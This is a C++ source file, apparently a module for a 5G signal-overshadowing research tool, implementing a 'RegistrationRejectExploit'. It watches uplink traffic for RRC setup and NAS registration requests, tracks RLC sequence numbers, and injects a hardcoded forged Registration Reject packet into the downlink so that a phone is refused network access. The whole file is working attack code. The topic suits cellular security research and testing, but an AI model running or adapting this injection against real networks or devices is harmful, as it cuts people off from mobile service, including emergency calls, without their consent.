#include "shadower/hdr/constants.h"
#include "shadower/hdr/exploit.h"
#include "shadower/hdr/msg_helper.h"

const uint8_t registration_reject[] = {
    0x01, 0x03, 0x00, 0x02,
    0x00, // ACK SN = 2
    0x41, 0x00, 0x0f, 0xc0, 0x00, 0x00, 0x00, 0x2c, 0x80, 0x8f, 0xc0, 0x08,
    0x83, 0x60, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00}; // Registration Reject

class RegistrationRejectExploit : public Exploit
{
public:
  RegistrationRejectExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                            SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    reg_reject.reset(new std::vector<uint8_t>(registration_reject, registration_reject + sizeof(registration_reject)));
  }

  void setup() override
  {
    f_registration_request = wd_filter("nas_5gs.mm.message_type == 0x41");
    f_rrc_setup_request    = wd_filter("nr-rrc.c1 == 0");
    f_ack_sn               = wd_field("rlc-nr.am.ack-sn");
    f_sn                   = wd_field("rlc-nr.am.sn");
    f_nack                 = wd_field("rlc-nr.am.nack-sn");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_registration_request);
    wd_register_filter(wd, f_rrc_setup_request);
    wd_register_field(wd, f_ack_sn);
    wd_register_field(wd, f_sn);
    wd_register_field(wd, f_nack);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // If ACK SN from UE received, then update the sequence number to new sequence number
      wd_field_info_t ack_sn_info = wd_read_field(wd, f_ack_sn);
      if (ack_sn_info) {
        uint32_t ack_sn_recv = packet_read_field_uint32(ack_sn_info);
        logger.info("Received ACK SN: %u", ack_sn_recv);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
        }
      }

      // If UL message received from the base station, then we have to send the ACK back to UE
      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        uint32_t sn_recv = packet_read_field_uint32(sn_info);
        logger.info("Received msg with SN: %u", sn_recv);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv;
        }
      }

      // If NACK received, then update the sequence number to new sequence number
      wd_field_info_t nack_info = wd_read_field(wd, f_nack);
      if (nack_info) {
        uint32_t nack_recv = packet_read_field_uint32(nack_info);
        logger.info("Received NACK SN: %u", nack_recv);
        dl_sn = nack_recv;
        send_registration_reject();
        return;
      }

      if (wd_read_filter(wd, f_rrc_setup_request)) {
        // Reset the sequence number
        dl_sn     = 0;
        dl_ack_sn = 1;
      }

      // If registration request detected, send out registration reject message
      if (wd_read_filter(wd, f_registration_request)) {
        logger.info("\033[0;31mRegistration request detected\033[0m");
        send_registration_reject();
        return;
      }
    }
  }

private:
  // Send out registration reject message
  void send_registration_reject()
  {
    reg_reject->data()[3]  = dl_ack_sn & 0xff;
    reg_reject->data()[9]  = dl_sn & 0xff;
    reg_reject->data()[11] = dl_sn & 0xff;
    dl_buffer_queue.push(reg_reject);
  }

  wd_filter_t f_registration_request;
  wd_filter_t f_rrc_setup_request;
  wd_field_t  f_ack_sn;
  wd_field_t  f_sn;
  wd_field_t  f_nack;

  uint32_t dl_sn     = 0;
  uint32_t dl_ack_sn = 1;

  std::shared_ptr<std::vector<uint8_t> > reg_reject;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new RegistrationRejectExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}